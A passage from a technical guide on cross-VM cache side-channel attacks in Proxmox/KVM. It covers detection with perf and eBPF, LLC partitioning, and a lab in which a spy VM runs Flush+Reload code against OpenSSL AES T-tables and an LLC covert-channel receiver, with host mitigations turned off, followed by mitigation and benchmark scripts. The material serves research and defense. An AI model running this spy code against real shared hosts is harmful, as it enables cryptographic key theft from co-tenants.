perf stat -p "$VICTIM_PID" -e \
    cache-misses,\
    cache-references,\
    LLC-load-misses,\
    LLC-loads,\
    L1-dcache-load-misses,\
    L1-dcache-loads,\
    branch-misses,\
    branches,\
    dTLB-load-misses,\
    dTLB-loads \
    --interval-print 1000 \
    sleep "$DURATION" 2>&1 | tee /tmp/perf_side_channel_monitor.log

echo ""
echo "[*] Analysis:"
echo "Suspicious indicators:"
echo "  1. LLC miss rate > 20% sustained → possible Prime+Probe"
echo "  2. L1D misses with periodic spike pattern → possible Flush+Reload"
echo "  3. Branch misprediction spikes → possible Spectre training"
echo "  4. Cache reference:miss ratio oscillating rapidly → eviction set probing"
echo ""
echo "[*] Raw data in /tmp/perf_side_channel_monitor.log"
```

**Advanced: per-process monitoring with eBPF:**

```bash
#!/bin/bash
# ebpf_cache_monitor.sh
# Use bpftrace to monitor LLC events per-process with timestamps
# Requires: bpftrace, CAP_BPF

cat << 'EBPF_SCRIPT' > /tmp/cache_monitor.bt
/* Monitor LLC miss patterns per process
 * High frequency of LLC misses from a process co-located with
 * a sensitive VM may indicate Prime+Probe activity */

hardware:cache-misses:100000 {
    @cache_misses[pid, comm] = count();
    @timestamps[pid] = nsecs;
}

interval:s:5 {
    printf("\n=== Cache miss report (5s interval) ===\n");
    print(@cache_misses);
    clear(@cache_misses);
}
EBPF_SCRIPT

echo "[*] Starting eBPF cache miss monitor (Ctrl+C to stop)"
bpftrace /tmp/cache_monitor.bt
```

### 9.3 System-Level Indicators

Beyond raw performance counters, system-level behaviors can indicate attack attempts:

**Unusual LLC eviction patterns:**
- A single VM generating disproportionate LLC misses relative to its working set size
- Periodic, regular cache miss patterns (attack probing cycles)
- Cache miss spikes synchronized with another VM's sensitive operations

**CPU throttling and power anomalies:**
- Increased power draw from cache/memory subsystem without proportional compute
- Thermal throttling from unusual memory access patterns

**Timing source access:**
- Excessive `rdtsc`/`rdtscp` usage (attackers need high-resolution timing)
- Attempts to calibrate timing through alternative sources (thread counting, performance counters from guest)

```bash
# Check if rdtsc is being used abnormally (from host perspective):
perf stat -e 'r003c' -p <pid> sleep 10  # CPU_CLK_UNHALTED proxy

# Monitor rdtsc frequency via audit (limited):
auditctl -a always,exit -F arch=b64 -S clock_gettime -k timing_access
```

### 9.4 Cloud Provider Detection Capabilities

Large cloud providers have deployed detection systems:

- **AWS**: Nitro Hypervisor with hardware-level performance counter monitoring; ability to detect abnormal memory access patterns across customer VMs
- **Google Cloud**: Custom-built detection for known attack patterns; automatic migration of VMs when anomalies detected
- **Azure**: Side-channel detection integrated into hypervisor scheduling decisions

These systems are proprietary and not available to on-premise operators, highlighting the value of the open-source detection approaches described here for Proxmox deployments.

### 9.5 Academic Detection Tools

Several research projects have produced detection and defense tools:

**CacheBar** (Zhou et al., 2016): A system that limits cache-based side channels by copying shared library pages and randomizing cache set mappings. Introduces noise into the side channel without fully eliminating it.

**CATalyst** (Liu et al., 2016): Uses Intel Cache Allocation Technology (CAT) to partition the LLC among VMs, preventing cross-VM cache-based attacks. Implemented as a kernel module that enforces LLC partitioning per VM.

**StealthMem** (Kim et al., 2012): Provides a set of "stealth pages" that lock critical data into the cache, preventing eviction-based observation. Useful for protecting cryptographic key schedules.

**Implementation example (CAT-based LLC partitioning):**

```bash
# Intel Cache Allocation Technology (CAT) — partition LLC per VM
# Requires: Intel CPU with CAT support (Xeon E5 v4+, all Xeon Scalable)

# Check CAT support:
cat /sys/fs/resctrl/info/L3/num_closids  # number of Classes of Service
cat /sys/fs/resctrl/info/L3/cbm_mask     # full cache bitmask

# Create partition for sensitive VM (COS 1):
mkdir -p /sys/fs/resctrl/vm_sensitive

# Assign 50% of LLC ways to sensitive VM:
# Full mask (16 ways): 0xffff
# Upper half: 0xff00
echo "L3:0=ff00" > /sys/fs/resctrl/vm_sensitive/schemata

# Create partition for untrusted VMs (COS 2):
mkdir -p /sys/fs/resctrl/vm_untrusted

# Assign lower 50% to untrusted VMs:
echo "L3:0=00ff" > /sys/fs/resctrl/vm_untrusted/schemata

# Assign QEMU PIDs to partitions:
echo $(pgrep -f "qemu.*vmid=100") > /sys/fs/resctrl/vm_sensitive/tasks
echo $(pgrep -f "qemu.*vmid=200") > /sys/fs/resctrl/vm_untrusted/tasks

# Verify:
cat /sys/fs/resctrl/vm_sensitive/schemata
cat /sys/fs/resctrl/vm_untrusted/schemata

# Monitor per-partition LLC occupancy:
cat /sys/fs/resctrl/vm_sensitive/mon_data/mon_L3_00/llc_occupancy
cat /sys/fs/resctrl/vm_untrusted/mon_data/mon_L3_00/llc_occupancy
```

---

## 10. Lab: Side-Channel Research Environment

### 10.1 Lab Architecture

Build an isolated lab to safely demonstrate and measure cross-VM side-channel attacks. This lab is for **authorized research in controlled environments only**.

**Requirements:**
- Physical host with Intel or AMD CPU (2018+ recommended for full mitigation feature set)
- Proxmox VE 8.x or bare KVM on Linux 6.x
- Two VMs on the same physical host (same socket, ideally same core for L1/L2 attacks)
- Network isolation (no external connectivity from lab VMs)
- Development tools: GCC, perf, turbostat, msr-tools

**Lab topology:**

```
┌────────────────────────────────────────────────────────────────┐
│  Physical Host: Proxmox VE 8.x                                  │
│  CPU: Intel Xeon E-2288G (8c/16t, Coffee Lake)                  │
│  RAM: 64GB ECC                                                   │
│  Kernel: 6.x with full mitigation controls                       │
│                                                                   │
│  ┌──────────────────┐       ┌──────────────────┐                │
│  │  VM: "Victim"     │       │  VM: "Spy"       │                │
│  │  ID: 100          │       │  ID: 200          │                │
│  │  Cores: 2         │       │  Cores: 2         │                │
│  │  RAM: 4GB         │       │  RAM: 4GB         │                │
│  │  Affinity: 0-1    │       │  Affinity: 0-1    │                │
│  │                    │       │  (same cores!)    │                │
│  │  Runs: OpenSSL    │       │  Runs: Spy tools  │                │
│  │  crypto workload  │       │  (Prime+Probe,    │                │
│  │                    │       │   F+R, etc.)      │                │
│  └──────────────────┘       └──────────────────┘                │
│                                                                   │
│  Network: isolated vmbr99 (no external route)                    │
│  KSM: enabled initially (for dedup attack demo)                  │
│  SMT: enabled initially (for cross-HT demo)                      │
│  L1D flush: disabled initially (to demonstrate attack)           │
└────────────────────────────────────────────────────────────────┘
```

### 10.2 Host Setup

```bash
# === Host preparation (Proxmox VE) ===

# Step 1: Create isolated network bridge
cat >> /etc/network/interfaces << 'EOF'
auto vmbr99
iface vmbr99 inet static
    address 10.99.0.1/24
    bridge-ports none
    bridge-stp off
    bridge-fd 0
    # No masquerading — truly isolated
EOF
systemctl restart networking

# Step 2: Disable mitigations initially (for attack demonstration)
# DANGEROUS — LAB ONLY — revert after testing
# /etc/default/grub:
# GRUB_CMDLINE_LINUX="mitigations=off"
# update-grub && reboot
# (Keep host offline during unmitigated testing)

# Step 3: Enable KSM for deduplication attack demo
echo 1 > /sys/kernel/mm/ksm/run
echo 200 > /sys/kernel/mm/ksm/sleep_millisecs

# Step 4: Verify SMT is active
cat /sys/devices/system/cpu/smt/active  # should be 1

# Step 5: Pin both VMs to same physical cores
# Verify core topology:
lscpu -e | head -20
# CPU NODE SOCKET CORE L1d:L1i:L2:L3 ONLINE
# 0   0    0      0    0:0:0:0        yes
# 8   0    0      0    0:0:0:0        yes    ← HT sibling of CPU 0
# ... identify sibling pairs

# Step 6: Install monitoring tools on host
apt install -y linux-perf msr-tools bpftrace turbostat
```

**VM configuration:**

```bash
# /etc/pve/qemu-server/100.conf (Victim VM)
boot: order=scsi0
cores: 2
memory: 4096
cpu: host
affinity: 0,8
net0: virtio=XX:XX:XX:XX:XX:01,bridge=vmbr99
scsi0: local-lvm:vm-100-disk-0,size=32G
scsihw: virtio-scsi-single
ostype: l26

# /etc/pve/qemu-server/200.conf (Spy VM)
boot: order=scsi0
cores: 2
memory: 4096
cpu: host
affinity: 0,8
net0: virtio=XX:XX:XX:XX:XX:02,bridge=vmbr99
scsi0: local-lvm:vm-200-disk-0,size=32G
scsihw: virtio-scsi-single
ostype: l26
```

### 10.3 Implement Flush+Reload Spy Process

**Inside the Spy VM (VM 200):**

```bash
# Install dependencies
apt install -y gcc make linux-headers-$(uname -r) \
    libssl-dev openssl git

# Build timing calibration tool
cat > calibrate_threshold.c << 'EOF'
/* calibrate_threshold.c
 * Determine cache hit/miss threshold for this specific CPU */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

#define ARRAY_SIZE (1024 * 1024)
#define ITERATIONS 10000

static inline uint64_t rdtsc_fenced(void) {
    uint32_t lo, hi;
    __asm__ volatile ("mfence; lfence; rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

int main(void) {
    volatile char *array = malloc(ARRAY_SIZE);
    memset((char *)array, 0x42, ARRAY_SIZE);

    uint64_t hit_total = 0, miss_total = 0;
    volatile char *target = &array[512 * 64]; /* mid-array */

    /* Measure cache HIT timing */
    *target; /* ensure cached */
    _mm_mfence();
    for (int i = 0; i < ITERATIONS; i++) {
        uint64_t t0 = rdtsc_fenced();
        *target;
        uint64_t t1 = rdtsc_fenced();
        hit_total += (t1 - t0);
    }

    /* Measure cache MISS timing */
    for (int i = 0; i < ITERATIONS; i++) {
        _mm_clflush((void *)target);
        _mm_mfence();
        uint64_t t0 = rdtsc_fenced();
        *target;
        uint64_t t1 = rdtsc_fenced();
        miss_total += (t1 - t0);
    }

    double hit_avg = (double)hit_total / ITERATIONS;
    double miss_avg = (double)miss_total / ITERATIONS;
    double threshold = (hit_avg + miss_avg) / 2.0;

    printf("Cache HIT  average: %.1f cycles\n", hit_avg);
    printf("Cache MISS average: %.1f cycles\n", miss_avg);
    printf("Recommended threshold: %.0f cycles\n", threshold);
    printf("\n");
    printf("If hits > 100 cycles, rdtsc may be intercepted by hypervisor.\n");
    printf("Check: cat /sys/devices/system/cpu/vulnerabilities/*\n");

    free((char *)array);
    return 0;
}
EOF

gcc -O2 -o calibrate_threshold calibrate_threshold.c
./calibrate_threshold
```

**Flush+Reload against shared library (requires KSM):**

```bash
# In Spy VM: Create a page identical to victim's OpenSSL T-table page
# This forces KSM to merge them, creating shared physical memory

cat > flush_reload_openssl.c << 'EOF'
/* flush_reload_openssl.c
 * Monitor OpenSSL AES T-table access patterns via Flush+Reload.
 * REQUIRES: KSM active on host, same OpenSSL version in spy & victim.
 * Lab/research use only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <dlfcn.h>
#include <signal.h>
#include <unistd.h>

#define THRESHOLD 150
#define NUM_LINES 16  /* AES T-table: 4 tables × 256 entries × 4 bytes
                         = 4096 bytes = 64 cache lines total
                         Monitor first table: 16 lines */
#define SAMPLES 500000

static volatile int running = 1;

void sigint_handler(int sig) { (void)sig; running = 0; }

static inline uint64_t timed_access(volatile char *addr) {
    uint64_t t0, t1;
    uint32_t lo, hi;
    __asm__ volatile ("mfence; lfence; rdtsc" : "=a"(lo), "=d"(hi));
    t0 = ((uint64_t)hi << 32) | lo;
    *(volatile char *)addr;
    __asm__ volatile ("lfence; rdtsc" : "=a"(lo), "=d"(hi));
    t1 = ((uint64_t)hi << 32) | lo;
    return t1 - t0;
}

int main(void) {
    signal(SIGINT, sigint_handler);

    /* Load OpenSSL shared library (same version as victim) */
    void *handle = dlopen("libcrypto.so.3", RTLD_NOW);
    if (!handle) {
        fprintf(stderr, "dlopen: %s\n", dlerror());
        fprintf(stderr, "Install same OpenSSL version as victim VM.\n");
        return 1;
    }

    /* Locate AES T-tables (Te0) — this offset is version-specific
     * Find with: nm -D /usr/lib/x86_64-linux-gnu/libcrypto.so.3 | grep Te0
     * Or: objdump -t /path/to/libcrypto.so.3 | grep -i "te0\|Te\[0\]" */
    /* For demonstration, use a known symbol offset */
    void *aes_sym = dlsym(handle, "AES_encrypt");
    if (!aes_sym) {
        fprintf(stderr, "Cannot find AES_encrypt symbol\n");
        dlclose(handle);
        return 1;
    }

    /* T-tables are typically near AES_encrypt in the .rodata section
     * This offset MUST be calibrated per OpenSSL build */
    volatile char *te0_base = (volatile char *)aes_sym + 0x200; /* ADJUST */

    printf("[*] Monitoring %d cache lines of T-table\n", NUM_LINES);
    printf("[*] Base address: %p\n", (void *)te0_base);
    printf("[*] Threshold: %d cycles\n", THRESHOLD);
    printf("[*] Press Ctrl+C to stop\n\n");

    uint64_t hits[NUM_LINES] = {0};
    uint64_t total_samples = 0;

    while (running && total_samples < SAMPLES) {
        for (int line = 0; line < NUM_LINES; line++) {
            volatile char *addr = te0_base + (line * 64);

            /* FLUSH */
            _mm_clflush((void *)addr);
        }
        _mm_mfence();

        /* WAIT — give victim time to potentially access T-table */
        for (volatile int d = 0; d < 1000; d++) {} /* ~1μs delay */

        /* RELOAD — measure each line */
        for (int line = 0; line < NUM_LINES; line++) {
            volatile char *addr = te0_base + (line * 64);
            uint64_t t = timed_access(addr);
            if (t < THRESHOLD) {
                hits[line]++;
            }
        }
        total_samples++;
    }

    printf("\n[*] Results after %lu samples:\n", total_samples);
    printf("Line | Hits | Hit Rate\n");
    printf("-----|------|----------\n");
    for (int i = 0; i < NUM_LINES; i++) {
        printf("  %2d | %5lu | %6.3f%%\n", i, hits[i],
               (double)hits[i] / total_samples * 100.0);
    }
    printf("\n[*] Lines with high hit rate indicate T-table entries\n");
    printf("    accessed by victim's AES operations.\n");
    printf("    Correlate with known plaintext to recover key bytes.\n");

    dlclose(handle);
    return 0;
}
EOF

gcc -O2 -o flush_reload_openssl flush_reload_openssl.c -ldl
```

### 10.4 Demonstrate Cross-VM Cache Timing

**Inside the Victim VM (VM 100):**

```bash
# Run continuous AES encryption as the target workload
cat > victim_workload.c << 'EOF'
/* victim_workload.c — continuous AES encryption for lab testing */
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#define BLOCK_SIZE 4096

int main(void) {
    unsigned char key[32], iv[16], plaintext[BLOCK_SIZE], ciphertext[BLOCK_SIZE + 16];
    int len, ciphertext_len;

    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));
    memset(plaintext, 0x41, BLOCK_SIZE);

    printf("[Victim] Starting continuous AES-256-CBC encryption...\n");
    printf("[Victim] PID: %d\n", getpid());

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned long count = 0;

    while (1) {
        RAND_bytes(iv, sizeof(iv)); /* fresh IV each time */
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
        EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, BLOCK_SIZE);
        ciphertext_len = len;
        EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
        ciphertext_len += len;

        count++;
        if (count % 100000 == 0) {
            printf("[Victim] %lu encryptions completed\n", count);
        }
        usleep(10); /* slight delay to make F+R timing easier */
    }

    EVP_CIPHER_CTX_free(ctx);
    return 0;
}
EOF

gcc -O2 -o victim_workload victim_workload.c -lssl -lcrypto
./victim_workload
```

**Inside the Spy VM (VM 200) — LLC Prime+Probe (no shared memory):**

```bash
# This works even WITHOUT KSM (no shared memory requirement)
# Build the prime_probe_llc.c from Section 2.3 and run:
gcc -O2 -o prime_probe_llc prime_probe_llc.c
./prime_probe_llc

# Observe: when victim VM is encrypting, certain LLC sets show
# higher eviction rates. These sets correspond to the victim's
# AES code and T-table data.
```

### 10.5 Measure Information Leakage Rate

```bash
#!/bin/bash
# measure_leakage.sh
# Quantify cross-VM information leakage bandwidth
# Run from the SPY VM

echo "=== Cross-VM Information Leakage Measurement ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

# Covert channel bandwidth test
# Sender (in victim VM via SSH or pre-arranged):
# Sends known bit pattern through cache contention

# Receiver (this VM):
# Measures LLC set activity and decodes bits

cat > covert_channel_rx.c << 'EOF'
/* covert_channel_rx.c — receive side of LLC covert channel
 * Measures eviction in designated LLC sets to decode transmitted bits */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <time.h>

#define LLC_WAYS 16
#define LLC_SETS 2048
#define CACHE_LINE 64
#define SIGNAL_SET 100      /* agreed-upon LLC set for communication */
#define BIT_PERIOD_US 1000  /* 1ms per bit = 1 Kbps theoretical */
#define NUM_BITS 1024       /* receive 1024 bits = 128 bytes */

static inline uint64_t rdtsc_fenced(void) {
    uint32_t lo, hi;
    __asm__ volatile ("mfence; lfence; rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

int main(void) {
    size_t buf_size = (size_t)LLC_WAYS * LLC_SETS * CACHE_LINE * 2;
    char *buffer = mmap(NULL, buf_size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buffer == MAP_FAILED) { perror("mmap"); return 1; }
    memset(buffer, 0x42, buf_size);

    /* Build eviction set for SIGNAL_SET */
    volatile char *evset[LLC_WAYS];
    size_t stride = (size_t)LLC_SETS * CACHE_LINE;
    size_t base_offset = (size_t)SIGNAL_SET * CACHE_LINE;
    for (int w = 0; w < LLC_WAYS; w++) {
        evset[w] = (volatile char *)buffer + base_offset + (w * stride);
    }

    /* Calibrate: measure probe time without sender activity */
    uint64_t baseline = 0;
    for (int i = 0; i < 1000; i++) {
        for (int w = 0; w < LLC_WAYS; w++) *evset[w];
        _mm_mfence();
        struct timespec ts = {0, 100000}; /* 100μs */
        nanosleep(&ts, NULL);
        uint64_t t = 0;
        for (int w = 0; w < LLC_WAYS; w++) {
            uint64_t t0 = rdtsc_fenced();
            *evset[w];
            uint64_t t1 = rdtsc_fenced();
            t += (t1 - t0);
        }
        baseline += t;
    }
    baseline /= 1000;
    uint64_t threshold = baseline + (baseline / 4); /* 25% above baseline */

    printf("[RX] Baseline probe time: %lu cycles\n", baseline);
    printf("[RX] Threshold: %lu cycles\n", threshold);
    printf("[RX] Receiving %d bits at %d μs/bit...\n", NUM_BITS, BIT_PERIOD_US);

    /* Receive bits */
    uint8_t received[NUM_BITS / 8];
    memset(received, 0, sizeof(received));
    int errors_detected = 0;

    struct timespec bit_period = {0, BIT_PERIOD_US * 1000L};

    for (int b = 0; b < NUM_BITS; b++) {
        /* Prime */
        for (int w = 0; w < LLC_WAYS; w++) *evset[w];
        _mm_mfence();

        /* Wait one bit period */
        nanosleep(&bit_period, NULL);

        /* Probe */
        uint64_t probe_time = 0;
        for (int w = 0; w < LLC_WAYS; w++) {
            uint64_t t0 = rdtsc_fenced();
            *evset[w];
            uint64_t t1 = rdtsc_fenced();
            probe_time += (t1 - t0);
        }

        /* Decode: slow probe (eviction) = '1', fast probe (no eviction) = '0' */
        int bit = (probe_time > threshold) ? 1 : 0;
        received[b / 8] |= (bit << (b % 8));
    }

    printf("[RX] Received %d bits (%d bytes)\n", NUM_BITS, NUM_BITS / 8);
    printf("[RX] First 16 bytes (hex): ");
    for (int i = 0; i < 16 && i < NUM_BITS / 8; i++) {
        printf("%02x ", received[i]);
    }
    printf("\n");

    /* Compare with known pattern to calculate BER */
    /* (Sender transmits 0xAA repeating pattern for BER measurement) */
    int bit_errors = 0;
    for (int i = 0; i < NUM_BITS / 8; i++) {
        uint8_t expected = 0xAA;
        uint8_t diff = received[i] ^ expected;
        while (diff) { bit_errors += diff & 1; diff >>= 1; }
    }
    double ber = (double)bit_errors / NUM_BITS;
    double bandwidth = (1.0 - ber) * (1000000.0 / BIT_PERIOD_US); /* bits/sec */

    printf("[RX] Bit Error Rate: %.4f (%d errors in %d bits)\n",
           ber, bit_errors, NUM_BITS);
    printf("[RX] Effective bandwidth: %.0f bps (%.1f Kbps)\n",
           bandwidth, bandwidth / 1000.0);

    munmap(buffer, buf_size);
    return 0;
}
EOF

gcc -O2 -o covert_channel_rx covert_channel_rx.c -lrt
```

### 10.6 Apply Mitigations and Verify

After demonstrating the attack with mitigations disabled, apply them incrementally and re-measure:

```bash
#!/bin/bash
# apply_mitigations.sh
# Apply mitigations incrementally on Proxmox host and measure impact
# Run as root on the host

echo "=== Side-Channel Mitigation Application ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

# === Phase 1: Disable KSM ===
echo "[Phase 1] Disabling KSM (eliminates Flush+Reload via deduplication)"
echo 0 > /sys/kernel/mm/ksm/run
echo 2 > /sys/kernel/mm/ksm/run  # unmerge existing pages
sleep 5
echo "  KSM status: $(cat /sys/kernel/mm/ksm/run)"
echo "  Shared pages: $(cat /sys/kernel/mm/ksm/pages_shared)"
echo "  → Re-run Flush+Reload attack — should no longer detect victim access"
echo ""
read -p "Press Enter after re-testing Flush+Reload..."

# === Phase 2: Enable L1D flush on VM entry ===
echo "[Phase 2] Enabling L1D flush on VM entry"
if [ -f /sys/module/kvm_intel/parameters/vmentry_l1d_flush ]; then
    echo "always" > /sys/module/kvm_intel/parameters/vmentry_l1d_flush
    echo "  L1D flush: $(cat /sys/module/kvm_intel/parameters/vmentry_l1d_flush)"
fi
echo "  → Re-run L1-based attacks — should show no L1 leakage across VMEXITs"
echo ""
read -p "Press Enter after re-testing L1 attacks..."

# === Phase 3: Enable core scheduling ===
echo "[Phase 3] Applying core scheduling (prevent cross-HT attacks)"
# Assign different cookies to each VM's QEMU process
VICTIM_PID=$(pgrep -f "qemu.*vmid=100" | head -1)
SPY_PID=$(pgrep -f "qemu.*vmid=200" | head -1)
echo "  Victim QEMU PID: $VICTIM_PID"
echo "  Spy QEMU PID: $SPY_PID"
# Core scheduling is applied via cgroups on newer kernels:
if [ -d /sys/fs/cgroup/machine.slice ]; then
    echo "  Core scheduling via systemd cgroup (automatic per-VM isolation)"
fi
echo "  → Re-run cross-HT attacks — should fail if VMs on different cookies"
echo ""
read -p "Press Enter after re-testing cross-HT attacks..."

# === Phase 4: Separate CPU affinity ===
echo "[Phase 4] Moving VMs to separate physical cores"
# Victim VM: cores 0,8 (physical core 0, both HTs)
# Spy VM: cores 2,10 (physical core 2, both HTs)
echo "  Changing Spy VM affinity from 0,8 to 2,10..."
# In production: edit /etc/pve/qemu-server/200.conf and restart VM
# For live demo: taskset -cp 2,10 $SPY_PID
if [ -n "$SPY_PID" ]; then
    taskset -cp 2,10 $SPY_PID 2>/dev/null || echo "  (requires VM restart for full effect)"
fi
echo "  → Re-run LLC Prime+Probe — still works across cores (shared LLC)"
echo "  → L1/L2 attacks should completely fail (separate L1/L2)"
echo ""
read -p "Press Enter after re-testing with separate cores..."

# === Phase 5: LLC partitioning via CAT ===
echo "[Phase 5] Applying LLC partitioning (Intel CAT)"
if [ -d /sys/fs/resctrl ]; then
    mkdir -p /sys/fs/resctrl/victim_vm 2>/dev/null
    mkdir -p /sys/fs/resctrl/spy_vm 2>/dev/null
    # Give each VM half the LLC ways
    echo "L3:0=ff00" > /sys/fs/resctrl/victim_vm/schemata 2>/dev/null
    echo "L3:0=00ff" > /sys/fs/resctrl/spy_vm/schemata 2>/dev/null
    [ -n "$VICTIM_PID" ] && echo "$VICTIM_PID" > /sys/fs/resctrl/victim_vm/tasks 2>/dev/null
    [ -n "$SPY_PID" ] && echo "$SPY_PID" > /sys/fs/resctrl/spy_vm/tasks 2>/dev/null
    echo "  CAT partitioning applied"
    cat /sys/fs/resctrl/victim_vm/schemata 2>/dev/null
    cat /sys/fs/resctrl/spy_vm/schemata 2>/dev/null
else
    echo "  CAT not available on this CPU (requires Xeon with RDT)"
fi
echo "  → Re-run LLC Prime+Probe — should show dramatically reduced signal"
echo ""
read -p "Press Enter after re-testing with CAT..."

# === Phase 6: Full mitigation kernel parameters ===
echo "[Phase 6] Full kernel mitigations (requires reboot)"
echo "  Recommended kernel cmdline for production:"
echo '  GRUB_CMDLINE_LINUX="spectre_v2=on pti=on l1tf=full,force \'
echo '    mds=full spec_store_bypass_disable=on tsx_async_abort=full \'
echo '    kvm_intel.vmentry_l1d_flush=always nosmt"'
echo ""
echo "  Edit /etc/default/grub, run update-grub, reboot."
echo ""

echo "=== Summary of mitigation effectiveness ==="
echo "┌──────────────────────┬──────────────────────┬───────────────────┐"
echo "│ Mitigation           │ Blocks               │ Performance Cost  │"
echo "├──────────────────────┼──────────────────────┼───────────────────┤"
echo "│ Disable KSM          │ Flush+Reload         │ ~0% (uses more RAM│"
echo "│ L1D flush on VMEXIT  │ L1-based cross-VM    │ 5-15% (VM-heavy)  │"
echo "│ Core scheduling      │ Cross-HT attacks     │ 5-10%             │"
echo "│ Separate core pin    │ L1/L2 sharing        │ Reduced density   │"
echo "│ CAT LLC partition    │ LLC Prime+Probe      │ Reduced LLC/VM    │"
echo "│ Disable SMT          │ All HT attacks       │ 20-30% throughput │"
echo "│ Full mitigations     │ All known vectors    │ 15-30% combined   │"
echo "└──────────────────────┴──────────────────────┴───────────────────┘"
```

### 10.7 Performance Impact Measurement

```bash
#!/bin/bash
# benchmark_mitigation_impact.sh
# Run inside a VM to measure performance impact of mitigations
# Requires: sysbench, fio, openssl

echo "=== Performance Benchmark Suite ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "Hostname: $(hostname)"
echo "Kernel: $(uname -r)"
echo "Mitigations: $(cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 2>/dev/null || echo N/A)"
echo ""

# CPU benchmark
echo "--- CPU (sysbench) ---"
if command -v sysbench &>/dev/null; then
    sysbench cpu --cpu-max-prime=50000 --threads=4 run 2>&1 | \
        grep -E "events per second|total time"
else
    echo "sysbench not installed"
fi
echo ""

# Syscall-heavy workload (most affected by KPTI)
echo "--- Syscall overhead (getpid loop) ---"
cat > /tmp/syscall_bench.c << 'CEOF'
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#define ITERATIONS 10000000
int main(void) {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    for (int i = 0; i < ITERATIONS; i++) { getpid(); }
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) +
                     (end.tv_nsec - start.tv_nsec) / 1e9;
    printf("%d getpid() calls in %.3f seconds (%.0f calls/sec)\n",
           ITERATIONS, elapsed, ITERATIONS / elapsed);
    return 0;
}
CEOF
gcc -O2 -o /tmp/syscall_bench /tmp/syscall_bench.c
/tmp/syscall_bench
echo ""

# Context switch benchmark
echo "--- Context switches (pipe ping-pong) ---"
cat > /tmp/ctx_switch_bench.c << 'CEOF'
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/wait.h>
#define ITERATIONS 100000
int main(void) {
    int p1[2], p2[2];
    pipe(p1); pipe(p2);
    char buf = 'x';
    struct timespec start, end;
    pid_t pid = fork();
    if (pid == 0) {
        for (int i = 0; i < ITERATIONS; i++) {
            read(p1[0], &buf, 1);
            write(p2[1], &buf, 1);
        }
        _exit(0);
    }
    clock_gettime(CLOCK_MONOTONIC, &start);
    for (int i = 0; i < ITERATIONS; i++) {
        write(p1[1], &buf, 1);
        read(p2[0], &buf, 1);
    }
    clock_gettime(CLOCK_MONOTONIC, &end);
    wait(NULL);
    double elapsed = (end.tv_sec - start.tv_sec) +
                     (end.tv_nsec - start.tv_nsec) / 1e9;
    printf("%d round-trips in %.3f seconds (%.0f ctx_switch/sec)\n",
           ITERATIONS, elapsed, (ITERATIONS * 2) / elapsed);
    return 0;
}
CEOF
gcc -O2 -o /tmp/ctx_switch_bench /tmp/ctx_switch_bench.c
/tmp/ctx_switch_bench
echo ""

# Crypto benchmark (affected by retpoline in OpenSSL)
echo "--- OpenSSL AES-256-CBC throughput ---"
openssl speed -elapsed -evp aes-256-cbc 2>&1 | tail -2
echo ""

# I/O benchmark (affected by KPTI + retpoline)
echo "--- fio random read 4K (if installed) ---"
if command -v fio &>/dev/null; then
    fio --name=test --rw=randread --bs=4k --direct=1 --numjobs=1 \
        --runtime=10 --time_based --size=256M --filename=/tmp/fio_test \
        --output-format=terse 2>/dev/null | \
        awk -F';' '{print "IOPS:", $8, "BW(KiB/s):", $7}'
    rm -f /tmp/fio_test
else
    echo "fio not installed"
fi
echo ""

echo "=== Benchmark complete ==="
echo "Run with mitigations=off and with full mitigations to compare."
```

### 10.8 Mitigation Verification Commands

Quick reference to verify all mitigations are correctly applied:

```bash
#!/bin/bash
# verify_mitigations.sh
# Comprehensive verification of side-channel mitigations
# Run on Proxmox host

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Side-Channel Mitigation Verification Report                ║"
echo "╠══════════════════════════════════════════════════════════════╣"
printf "║  Date: %-51s ║\n" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
printf "║  Kernel: %-48s ║\n" "$(uname -r)"
printf "║  CPU: %-51s ║\n" "$(grep 'model name' /proc/cpuinfo | head -1 | cut -d: -f2 | xargs)"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

echo "=== 1. Vulnerability Status ==="
for vuln in /sys/devices/system/cpu/vulnerabilities/*; do
    printf "  %-25s %s\n" "$(basename $vuln):" "$(cat $vuln)"
done
echo ""

echo "=== 2. SMT Status ==="
echo "  Active: $(cat /sys/devices/system/cpu/smt/active)"
echo "  Control: $(cat /sys/devices/system/cpu/smt/control)"
echo ""

echo "=== 3. KSM Status ==="
echo "  Running: $(cat /sys/kernel/mm/ksm/run)"
echo "  Pages shared: $(cat /sys/kernel/mm/ksm/pages_shared)"
echo "  Pages sharing: $(cat /sys/kernel/mm/ksm/pages_sharing)"
echo ""

echo "=== 4. KVM Module Parameters ==="
if [ -f /sys/module/kvm_intel/parameters/vmentry_l1d_flush ]; then
    echo "  Intel:"
    echo "    L1D flush: $(cat /sys/module/kvm_intel/parameters/vmentry_l1d_flush)"
fi
if [ -f /sys/module/kvm_amd/parameters/sev ]; then
    echo "  AMD:"
    echo "    SEV: $(cat /sys/module/kvm_amd/parameters/sev)"
